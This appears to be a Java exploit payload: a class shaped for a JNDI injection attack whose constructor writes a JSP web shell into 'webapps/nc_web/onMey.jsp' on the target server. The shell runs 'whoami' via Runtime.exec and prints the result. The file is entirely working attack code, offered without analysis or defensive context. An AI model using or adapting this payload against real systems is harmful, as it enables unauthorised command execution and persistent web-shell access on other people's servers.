import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.FileNotFoundException;
import java.io.PrintWriter;
import java.io.Serializable;
import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Hashtable;

public class test implements ObjectFactory, Serializable {

    public test() {
        SimpleDateFormat formatter= new SimpleDateFormat("yyyy-MM-dd 'at' HH:mm:ss z");
        Date date = new Date(System.currentTimeMillis());
        String fileName = "webapps/nc_web/onMey.jsp";
        String code = formatter.format(date)+"<% {java.io.InputStream in = Runtime.getRuntime().exec(\"whoami\").getInputStream();int a = -1;byte[] b = new byte[2048];out.print(\"<pre>\");while((a=in.read(b))!=-1){out.println(\"whoami:\"+new String(b));}out.print(\"</pre>\");} %>\n";
        try (PrintWriter writer = new PrintWriter(fileName, "UTF-8")) {
            writer.println(code);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }


    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return null;
    }
}